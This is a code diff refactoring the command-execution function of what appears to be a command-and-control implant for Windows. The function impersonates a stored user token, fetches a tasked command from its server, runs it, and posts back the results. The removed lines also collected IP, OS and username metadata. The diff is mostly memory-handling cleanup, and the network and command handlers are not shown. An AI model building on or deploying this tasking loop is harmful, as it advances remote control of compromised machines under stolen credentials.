@@ -122,126 +122,79 @@ void execution_setup(HeapStore *heapStorePointer)
     }
 }
 
-// Thread function for executing the command
+/**
+ * execute - Retrieve and process an inbound command, then send its response.
+ * @heapStorePointer: Pointer to the HeapStore containing agent and context information.
+ *
+ * Sets the thread token, fetches the next command via get_command_data,
+ * allocates and populates an OutboundJsonDataStruct, calls agent_send
+ * to add metadata, encode, post, and free resources, and finally frees
+ * inbound data. Returns 0 on success or non-zero on error.
+ */
 DWORD WINAPI execute(HeapStore *heapStorePointer)
 {
-    // agent_send_now(heapStorePointer, "Starting execution");
-
-    // add a get token func here
+    // Set thread token
     if (!set_thread_token(heapStorePointer->currentUserStore->token))
     {
         DEBUG_LOG("Could not set token!");
     }
 
-    // Send + parse method
-
-    // this fills in the command, arg and command_id
-    InboundJsonDataStruct InboundJsonData = get_command_data(heapStorePointer->agentStore->agent_id);
-    // this populates the new structure with the agent_uuid
+    // Fetch inbound command
+    InboundJsonDataStruct InboundJsonData =
+        get_command_data(heapStorePointer->agentStore->agent_id);
     InboundJsonData.agent_id = heapStorePointer->agentStore->agent_id;
 
+    // Validate inbound command
     if (!InboundJsonData.command)
     {
         DEBUG_LOG("Could not get command");
-
-        if (InboundJsonData.command_id)
-            free(InboundJsonData.command_id);
-        if (InboundJsonData.args)
-            free(InboundJsonData.args);
-
+        free(InboundJsonData.command_id);
+        free(InboundJsonData.args);
         return 1;
     }
 
     DEBUG_LOG("Decoded Command: %s\n", InboundJsonData.command);
 
-    // go ahead and setup our struct for outbound comms
-    // using calloc for init on the values here
-    OutboundJsonDataStruct *OutboundJsonData = (OutboundJsonDataStruct *)calloc(1, sizeof(OutboundJsonDataStruct));
+    // Allocate outbound structure
+    OutboundJsonDataStruct *OutboundJsonData =
+        calloc(1, sizeof(*OutboundJsonData));
     if (!OutboundJsonData)
     {
-        DEBUG_LOG("Memory allocation failed for OutboundJsonData.\n");
+        DEBUG_LOG("Memory allocation failed for OutboundJsonData.");
+        free(InboundJsonData.command);
+        free(InboundJsonData.command_id);
+        free(InboundJsonData.args);
         return 1;
     }
 
-    // Assign UUID
-    OutboundJsonData->agent_id = strdup(heapStorePointer->agentStore->agent_id); // Allocates memory and copies the string. Previous strncpy_s only copied, not allocated. Need to free
-    OutboundJsonData->command_result_data = NULL;
-
-    // Parse command and modify OutboundJsonData
-    parse_command(InboundJsonData.command, InboundJsonData.args, OutboundJsonData, heapStorePointer);
-
-    DEBUG_LOG("UUID: %s\n", OutboundJsonData->agent_id);
-    DEBUG_LOG("COMMAND_ID: %s\n", InboundJsonData.command_id);
-    DEBUG_LOG("command_result_data: %s\n", OutboundJsonData->command_result_data ? OutboundJsonData->command_result_data : "NULL");
-
-    // get data needed for metadata stuff
-    char *int_ip = "placeholder_int_ip";
-    OutboundJsonData->int_ip = strdup(int_ip);
-    if (!OutboundJsonData->int_ip)
+    // Populate agent_id
+    OutboundJsonData->agent_id = strdup(
+        heapStorePointer->agentStore->agent_id);
+    if (!OutboundJsonData->agent_id)
     {
-        DEBUG_LOG("Memory allocation failed for int_ip.\n");
-        free(OutboundJsonData->int_ip);
+        DEBUG_LOG("Memory allocation failed for agent_id.");
         free(OutboundJsonData);
-        return;
+        free(InboundJsonData.command);
+        free(InboundJsonData.command_id);
+        free(InboundJsonData.args);
+        return 1;
     }
 
-    // external ip
-    char *ext_ip = "placeholder_ext_ip";
-    OutboundJsonData->ext_ip = strdup(ext_ip);
-    if (!OutboundJsonData->ext_ip)
-    {
-        DEBUG_LOG("Memory allocation failed for ext_ip.\n");
-        free(OutboundJsonData->ext_ip);
-        free(OutboundJsonData);
-        return;
-    }
+    // Parse command into outbound struct
+    parse_command(InboundJsonData.command,
+                  InboundJsonData.args,
+                  OutboundJsonData,
+                  heapStorePointer);
 
-    // os
-    OutboundJsonData->os = get_os(heapStorePointer);
-    if (!OutboundJsonData->os)
-    {
-        DEBUG_LOG("Memory allocation failed for os.\n");
-        free(OutboundJsonData->os);
-        free(OutboundJsonData);
-        return;
-    }
+    // Send response and cleanup outbound struct
+    agent_send(heapStorePointer,
+               OutboundJsonData,
+               InboundJsonData.command_id);
 
-    OutboundJsonData->user = get_current_username(heapStorePointer);
-    if (!OutboundJsonData->user)
-    {
-        DEBUG_LOG("Memory allocation failed for user.\n");
-        free(OutboundJsonData->user);
-        free(OutboundJsonData);
-        return;
-    }
-
-    // Convert to JSON and send
-    // char *encoded_json_response = encode_json(OutboundJsonData->agent_id, OutboundJsonData->command_result_data, InboundJsonData.command_id);
-    char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
-                                              OutboundJsonData->command_result_data,
-                                              InboundJsonData.command_id,
-                                              OutboundJsonData->int_ip,
-                                              OutboundJsonData->ext_ip,
-                                              OutboundJsonData->os,
-                                              OutboundJsonData->user);
-
-    post_data(encoded_json_response, heapStorePointer->agentStore->agent_id);
-
-    // free allocated memory
-    // need to double check this
-
-    free(InboundJsonData.command);    // Allocated in decode_command_json
-    free(InboundJsonData.command_id); // Allocated in decode_command_json
-    free(InboundJsonData.args);       // Allocated in decode_command_json (if applicable)
-
-    // Outbound freeing. Only need to free if using a func that allocates memory to a strucutre member
-    free(OutboundJsonData->agent_id);            // freed due to 'OutboundJsonData->agent_id = strdup(agent_id);' line.
-    free(OutboundJsonData->command_result_data); // freeing due to set_response_data function in whipser_commands.h
-    free(OutboundJsonData->int_ip);
-    free(OutboundJsonData->ext_ip);
-    free(OutboundJsonData->os);
-    free(OutboundJsonData->user);
-    free(OutboundJsonData); // freeing the strucutre itself: 'OutboundJsonDataStruct* OutboundJsonData = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));'
+    // Free inbound data
+    free(InboundJsonData.command);
+    free(InboundJsonData.command_id);
+    free(InboundJsonData.args);
 
     return 0;
 }
